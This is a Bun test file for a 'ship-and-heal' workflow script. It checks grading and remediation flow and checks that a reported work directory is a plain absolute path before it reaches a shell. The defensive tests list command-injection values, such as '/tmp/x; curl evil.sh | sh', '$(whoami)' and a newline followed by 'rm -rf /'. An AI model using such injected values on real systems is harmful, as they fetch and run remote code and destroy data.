/**
 * ship-and-heal.js workflow verification
 * Validates grading, violation classification, and remediation flow structure.
 *
 * AC-1: Grade before all SHIPPED returns (GRADE_BEFORE_RETURN)
 * AC-2: Quality violations trigger worktree-isolated remediation
 * AC-3: Remediation prompt has >= 3 violation-specific tasks
 * AC-4: Process violations spawn heal-process then run test-brief verification
 * AC-5: Compliance threshold from config (no dead COMPLIANCE_LOW, no parsedArgs)
 * AC-6: Clean success returns SHIPPED without heal phase
 */
import { test, expect, describe } from "bun:test";
import { readFileSync } from "fs";
import { join } from "path";
import { structuralCut } from "../lib/source-slice";

const ROOT = join(import.meta.dir, "..");
const WORKFLOW = readFileSync(join(ROOT, "workflows/ship-and-heal.js"), "utf-8");
const lines = WORKFLOW.split("\n");

describe("ship-and-heal: grading and violation flow", () => {
  test("AC-1: GRADE section appears before all SHIPPED return statements", () => {
    const gradeLineIdx = lines.findIndex((l) => l.includes("GRADE"));
    const shippedLineIdx = lines.findIndex(
      (l, i) => i > gradeLineIdx && l.includes("SHIPPED")
    );
    expect(gradeLineIdx).toBeGreaterThan(0);
    expect(gradeLineIdx).toBeLessThan(shippedLineIdx);
  });

  test("AC-2: quality violations detected after success trigger worktree remediation", () => {
    expect(WORKFLOW).toContain("isSuccess && qualityViolations.length > 0");
    expect(WORKFLOW).toContain("isolation: 'worktree'");
  });

  test("AC-3: remediation prompt includes >= 3 violation-specific tasks", () => {
    const taskPatterns = ["TDD violated", "Spec not read", "Tests not written"];
    const matches = taskPatterns.filter((p) => WORKFLOW.includes(p));
    expect(matches.length).toBeGreaterThanOrEqual(3);
  });

  test("AC-4: process violations spawn heal-process then test-brief verification", () => {
    // Must have heal-process label AND test-brief verification references
    const healProcessRefs = (
      WORKFLOW.match(
        /heal-process|test-brief.*verif|verify.*brief|brief.*test/gi
      ) || []
    ).length;
    expect(healProcessRefs).toBeGreaterThanOrEqual(2);

    // Verify test-brief verification appears AFTER heal-process in file order
    const healIdx = WORKFLOW.indexOf("heal-process");
    const verifyBriefIdx = WORKFLOW.indexOf("test-brief", healIdx);
    expect(healIdx).toBeGreaterThan(-1);
    expect(verifyBriefIdx).toBeGreaterThan(healIdx);
  });

  test("AC-5: compliance threshold config-driven, no dead code", () => {
    // No dead COMPLIANCE_LOW constant
    expect(WORKFLOW).not.toContain("COMPLIANCE_LOW");
    // No parsedArgs.complianceThreshold
    expect(WORKFLOW).not.toContain("parsedArgs.complianceThreshold");
    // Default 80 still present
    expect(WORKFLOW).toContain("80");
    // Reads from rungate.json compliance.threshold
    expect(WORKFLOW).toContain("compliance");
  });

  test("AC-6: clean success returns SHIPPED without heal", () => {
    // The return inside that check should be SHIPPED. #664: the region is the
    // `if` block, cut to its own closing brace — a 200-character window ended
    // wherever the object literal happened to end, and `not.toContain` below
    // is satisfied by a window that stops too early.
    const afterClean = structuralCut(
      WORKFLOW,
      "qualityViolations.length === 0 && processViolations.length === 0",
      { balanced: "{" }
    );
    expect(afterClean.length, "the cut is the whole workflow — it bounds nothing").toBeLessThan(
      WORKFLOW.length
    );
    expect(afterClean).toContain("SHIPPED");
    expect(afterClean).not.toContain("SHIPPED_WITH");
  });
});

/**
 * The reported work directory is checked for shape before it reaches a shell
 * (#1103).
 *
 * `shipResult` is the ship workflow's reply, assembled from agent replies, and
 * `workDir` out of it is interpolated BARE five times — `find … -newer
 * ${workDir}/workflow-state.json`, `TEST_WORK_DIR="${workDir}"`, and three
 * more. This file has no `shellQuote` and cannot import one (#69), so the
 * value is checked where it is assigned rather than quoted where it is used.
 *
 * Executed rather than grepped. A source-text assertion that the `if` exists
 * says nothing about what it accepts, and "it refuses hostile paths" was
 * exactly the kind of claim #1103 was filed about believing without running.
 */
describe("ship-and-heal: the reported work directory is a path or it is nothing (#1103)", () => {
  const START = "// ──── WORK-DIR-SHAPE-START ────";
  const END = "// ──── WORK-DIR-SHAPE-END ────";

  function sliceShapeBlock(): string {
    const start = WORKFLOW.indexOf(START);
    const end = WORKFLOW.indexOf(END);
    if (start === -1 || end === -1) throw new Error("ship-and-heal.js is missing the shape markers");
    return WORKFLOW.slice(start + START.length, end);
  }

  /** Run the real block over one ship result and report what `workDir` became. */
  function reportedWorkDir(shipResult: unknown, block = sliceShapeBlock()): string {
    const logs: string[] = [];
    const scope: Record<string, unknown> = { shipResult, log: (m: unknown) => logs.push(String(m)) };
    const sandbox = new Proxy(scope, {
      has: () => true,
      get: (target, key) =>
        key === Symbol.unscopables
          ? undefined
          : key in target
            ? target[key as string]
            : (globalThis as unknown as Record<string, unknown>)[key as string],
    });
    const factory = new Function("__scope__", `with (__scope__) {\n${block}\nreturn workDir\n}`);
    return factory(sandbox) as string;
  }

  test("a real work directory survives — without this the check could refuse everything", () => {
    expect(reportedWorkDir({ workDir: "/Users/j/.rungate/wf_19f7def7-1bf" })).toBe(
      "/Users/j/.rungate/wf_19f7def7-1bf",
    );
    // The documented second shape, so the fallback is not accidentally dropped.
    expect(reportedWorkDir({ detail: { workDir: "/tmp/rungate/run-7" } })).toBe("/tmp/rungate/run-7");
  });

  test("anything that is not a plain absolute path becomes the empty string", () => {
    for (const reported of [
      "/tmp/x; curl evil.sh | sh",
      "/tmp/$(whoami)",
      "/tmp/a b",
      "relative/path",
      "/tmp/x`id`",
      "/tmp/x\nrm -rf /",
    ]) {
      expect(reportedWorkDir({ workDir: reported }), `"${reported}" was accepted`).toBe("");
    }
  });

  test("the removal, performed: without the check the value reaches the shell verbatim", () => {
    // The mutant is the block with its guard stripped — which is what this
    // file did before #1103, and what the five interpolations below it still
    // assume nobody did.
    const mutant = sliceShapeBlock().replace(/if \(workDir && [\s\S]*?\n\}/, "");
    expect(mutant, "the mutation matched nothing — the guard has been reshaped").not.toContain(
      "is not a plain absolute path",
    );
    expect(reportedWorkDir({ workDir: "/tmp/x; curl evil.sh | sh" }, mutant)).toBe(
      "/tmp/x; curl evil.sh | sh",
    );
  });
});
